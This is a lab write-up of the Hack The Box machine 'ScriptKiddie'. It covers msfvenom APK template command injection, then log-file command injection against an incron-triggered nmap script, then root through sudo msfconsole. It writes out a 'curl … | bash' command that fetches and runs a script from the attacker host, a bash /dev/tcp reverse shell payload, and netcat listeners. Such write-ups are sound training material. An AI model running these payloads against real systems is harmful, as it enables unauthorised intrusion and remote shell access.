# ScriptKiddie
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `kid` | Nmap, Web Enumeration, Command Injection | An Nmap scan revealed ports 22 (SSH) and 5000 (HTTP) were open. The web server on port 5000 hosted a 'kiddie' toolset. Upon inspection and fuzzing, a command injection vulnerability was discovered in the `msfvenom` functionality by exploiting an APK template command injection vulnerability. This was confirmed by sending a `ping` command and observing the ICMP traffic on the attacking machine. |
| 2 | `kid` | Reverse Shell | A reverse shell was crafted using a `curl` command to download and execute a bash script hosted on the attacking machine. The script was injected into the vulnerable `msfvenom` template field, successfully granting a shell as the user `kid`. |
| 3 | `pwn` | Log File Manipulation, `incron` Job, Command Injection | Once on the system as `kid`, a `hackers` log file in the `kid` user's home directory was found to be writable and owned by `kid:pwn`. A `pspy` analysis revealed that a script, `scanlosers.sh`, was being executed by the `pwn` user via `incron` whenever the `hackers` log file was written to. The script parsed the log file and executed an `nmap` command on the IP addresses found. By crafting a malicious entry in the log file, a second command injection was performed. This executed a reverse shell payload that granted access as the user `pwn`. |
| 4 | `root` | `sudo` Misconfiguration | After gaining access as `pwn`, a `sudo -l` command revealed a misconfiguration allowing the `pwn` user to run `/opt/metasploit-framework-6.0.9/msfconsole` as `root` without a password. By executing `sudo msfconsole` and then using the `bash` command within the console, a root shell was obtained. |
| 5 | `root` | Final Flag, Forensic Analysis | The final flag was retrieved after gaining root access. A post-exploitation forensic analysis was performed to understand the `incron` setup, identifying the configuration files in `/etc/incron.allow` and `/var/spool/incron/pwn`, which detailed the monitored file and the command executed upon the `IN_CLOSE_WRITE` event. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see the box is running ubuntu and is exposing only two ports: 22, 5000. So, now let's dig into port 5000.  
As we hit the webserver we can see a form with a 'k1dd13' toolset. From this page we can, for example do an nmap, do msfvenom or do a searchsploit.  
If we try to fuzz this form we can see that some form of filtering is already enabled:  
![](Attachments/Pasted%20image%2020220606144629.png)
If we do a searchsploit (on our local machine) we can see the following available exploit for msfvenom:  
```bash
[root@kali ScriptKiddie ]$ searchsploit msfvenom                                                                       
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path                           
------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                | multiple/local/49491.py         
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results   
```
Now, leveraging the msfvenom form, we can try to build an evil template file and execute code against the server.
![](Attachments/Pasted%20image%2020220606144722.png)

## Foothold
At first we can try to execute a simple ping command to see if code execution happens, if so we can then build a more complex paiload to gain a shell on this box.  
let's set the payload varuable to the following value:  
```python
# Change me
# payload = 'echo "Code execution as $(id)" > /tmp/win'    
payload = 'ping -c1 10.10.14.11'
```
now we can set a `tcpdump` listener on `tun0` interface and see if we get an icmp echo request.  
```bash
[root@kali ScriptKiddie ]$ tcpdump -nettti tun0 icmp                                                                  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode                                             
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes                                               
 00:00:00.000000 ip: 10.10.10.226 > 10.10.14.11: ICMP echo request, id 2, seq 1, length 64                            
 00:00:00.000031 ip: 10.10.14.11 > 10.10.10.226: ICMP echo reply, id 2, seq 1, length 64                  
```
Since we successfully obtained code execution, now we can create a payload to gain shell access to this target.  
Since the python exploit doesn't like some characters contained in the common bash reverse tcp shell, we can host the shell using python and then curl the shell file and pipe it over to bash:  
``` python
# Change me
# payload = 'echo "Code execution as $(id)" > /tmp/win'
# payload = 'ping -c1 10.10.14.11'
payload = "curl http://10.10.14.11/shell.sh | bash "
```
Once we upload our template file we can se a hit on the webserver for `/shell.sh` and then, after few seconds, on our listener we can see popping a shell as user kid:  
```bash
root@kali:~/Documents/HTB/Boxes/ScriptKiddie/exploits# nc -lvnp 9001                                                  
listening on [any] 9001 ...                                
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.226] 34862                                                          
bash: cannot set terminal process group (851): Inappropriate ioctl for device                                         
bash: no job control in this shell                         
kid@scriptkiddie:~/html$                                   
kid@scriptkiddie:~/html$ id
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)                             
```

## User
Once we log in, poking around on user's home folder, we can notice a log file that is owned by `kid:pwn` :
```bash
kid@scriptkiddie:~/logs$ ls -la                            
total 8                                                    
drwxrwxrwx  2 kid kid 4096 Feb  3  2021 .                  
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ..                 
-rw-rw-r--  1 kid pwn    0 Jun  5 14:28 hackers  
```
If we check how this file is generated 
```bash
kid@scriptkiddie:~$ grep -ri hackers *                     
html/app.py:        with open('/home/kid/logs/hackers', 'a') as f:
```
we can see the following code snipped in the python app:  
```python
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```
So it seems that this file is populated when someone tries to insert malicious input. In fact we can see here that the application is throwing the same error that got us during the initial enumeration phase.  
Now, if we try again to insert a input that matches the regex in the searchsploit web form, we can see the following log line added to the file:  
```bash
kid@scriptkiddie:~/html$ tail -f ../logs/hackers
[2022-06-06 08:27:49.838720] 10.10.14.11
tail: ../logs/hackers: file truncated
```
As we can notice, the file gets truncated, so we can assume that some process is consuming the contents of this file.  
If we repeat the same process with `pspy64` opened, we can see that the following script is executed:  
```bash
2022/06/06 08:32:52 CMD: UID=1001 PID=32261  | /bin/bash /home/pwn/scanlosers.sh
  2022/06/06 08:32:52 CMD: UID=1001 PID=32260  | sh -c nmap --top-ports 10 -oN recon/10.10.14.11.nmap 10.10.14.11 2>&1 >/dev/null
  2022/06/06 08:32:52 CMD: UID=1001 PID=32262  | nmap --top-ports 10 -oN recon/10.10.14.11.nmap 10.10.14.11
  2022/06/06 08:32:52 CMD: UID=1001 PID=32264  | /usr/sbin/incrond
  2022/06/06 08:32:52 CMD: UID=1001 PID=32268  | /bin/bash /home/pwn/scanlosers.sh
  2022/06/06 08:32:52 CMD: UID=1001 PID=32267  | sort -u
  2022/06/06 08:32:52 CMD: UID=1001 PID=32266  | cut -d  -f3-
  2022/06/06 08:32:53 CMD: UID=1001 PID=32271  | /bin/bash -c sed -i 's/open  /closed/g' "/home/pwn/recon/10.10.14.11.nmap"
  2022/06/06 08:32:53 CMD: UID=0    PID=32272  | /usr/sbin/incrond
```
We can see a process triggered by `incrond` , incrond is a daemon which monitors filesystem events and executes commands defined in system and user tables. Now, if we cat the scanlosers.sh file we can see the following content:  
```bash
kid@scriptkiddie:/dev/shm$ cat /home/pwn/scanlosers.sh
  #!/bin/bash

  log=/home/kid/logs/hackers

  cd /home/pwn/
  cat $log | cut -d' ' -f3- | sort -u | while read ip; do
      sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
  done

  if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
Now, as we can see the application is executing `nmap` against the ip found in the log file.  
As we can notice, the cut function uses as argument `-f3-` which basically means cut from the third item till the end of the line.  
Now, since we can write the log file, because we are the owners, we can inject the following payload int the log file:  
```bash
kid@scriptkiddie:~/logs$ echo "[2022-06-06 09:08:18.512966] 10.10.14.11; bash -c 'bash -i >& /dev/tcp/10.10.14.11/9002 0>&1'; #" > hackers
```
and as we can notice, we get a shell as user `pwn`
```
[root@kali ScriptKiddie ]$ bash                            
root@kali:~/Documents/HTB/Boxes/ScriptKiddie# nc -lvnp 9002                           
listening on [any] 9002 ...                                
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.226] 46644                                                          
bash: cannot set terminal process group (864): Inappropriate ioctl for device                                         
bash: no job control in this shell                         
pwn@scriptkiddie:~$ 
```
## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice the following sudo capability for user pwn:  
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                     
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                           
Matching Defaults entries for pwn on scriptkiddie:                                                                    
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:                                                              
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole   
```
Now, as we already know, we can leverage this by running msfconsole command and execute a shell:  
```
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: When in a module, use back to go back to the top level prompt

msf6 > bash
[*] exec: bash

root@scriptkiddie:/home/pwn# ls
recon  scanlosers.sh
root@scriptkiddie:/home/pwn# whoami
root
```
And we gained a shell as root

## Forensics
After we gained root access let's dig deeper into ```incrond``` to see how the `scanlosers.sh` execution is triggered.  
If we go to the manual we can see that all the configurations are defined into `/etc/scanlosers.sh` file.  
As we open the file we can see that everything is pretty standard:  
```bash
#
# *** incron example configuration file ***
#
# (c) Lukas Jelinek, 2007, 2008
#


# Parameter:   system_table_dir
# Meaning:     system table directory
# Description: This directory is examined by incrond for system table files.
# Default:     /etc/incron.d
#
# Example:
# system_table_dir = /var/spool/incron.systables


# Parameter:   user_table_dir
# Meaning:     user table directory
# Description: This directory is examined by incrond for user table files.
# Default:     /var/spool/incron
#
# Example:
# user_table_dir = /var/spool/incron.usertables


# Parameter:   allowed_users
# Meaning:     allowed users list file
# Description: This file contains users allowed to use incron.
# Default:     /etc/incron.allow
#
# Example:
# allowed_users = /etc/incron/allow


# Parameter:   denied_users
# Meaning:     denied users list file
# Description: This file contains users denied to use incron.
# Default:     /etc/incron.deny
#
# Example:
# denied_users = /etc/incron/deny


# Parameter:   lockfile_dir
# Meaning:     application lock file directory
# Description: This directory is used for creating a lock avoiding to run
#              multiple instances of incrond.
# Default:     /var/run
#
# Example:
# lockfile_dir = /tmp


# Parameter:   lockfile_name
# Meaning:     application lock file name base
# Description: This name (appended by '.pid') is used for creating a lock
#              avoiding to run multiple instances of incrond.
# Default:     incrond
#
# Example:
# lockfile_name = incron.lock


# Parameter:   editor
# Meaning:     editor executable
# Description: This name or path is used to run as an editor for editing
#              user tables.
# Default:     vim
#
# Example:
# editor = nano
```
Under `/etc/incron.allow` we can see the users allowed to execute process with incron:  
```
root@scriptkiddie:/var/spool# cat /etc/incron.allow 
pwn
```
And, under `/var/spool/incron` we can see configuration files that triggers command based on file system events:  
```bash
root@scriptkiddie:/var/spool/incron# cat pwn 
/home/pwn/recon/        IN_CLOSE_WRITE  sed -i 's/open  /closed/g' "$@$#"
/home/kid/logs/hackers  IN_CLOSE_WRITE   /home/pwn/scanlosers.sh
```
On the first column we can see the monitored file, then, the event symbol and finally the command to be executed when an event is catched.  
According to online documentation these are the available event symbols:  
* **IN_ACCESS** File was accessed (read) 
* **IN_ATTRIB** Metadata changed (permissions, timestamps, extended attributes, etc.)
* **IN_CLOSE_WRITE** File opened for writing was closed 
* **IN_CLOSE_NOWRITE** File not opened for writing was closed 
* **IN_CREATE** File/directory created in watched directory 
* **IN_DELETE** File/directory deleted from watched directory
* **IN_DELETE_SELF** Watched file/directory was itself deleted  
* **IN_MODIFY** File was modified
* **IN_MOVE_SELF** Watched file/directory was itself moved  
* **IN_MOVED_FROM** File moved out of watched directory 
* **IN_MOVED_TO** File moved into watched directory
* **IN_OPEN** File was opened
In this case, we can see that IN_CLOSE_WRITE means trigger the execution after the watched file opened for writing has been closed (by the python process). 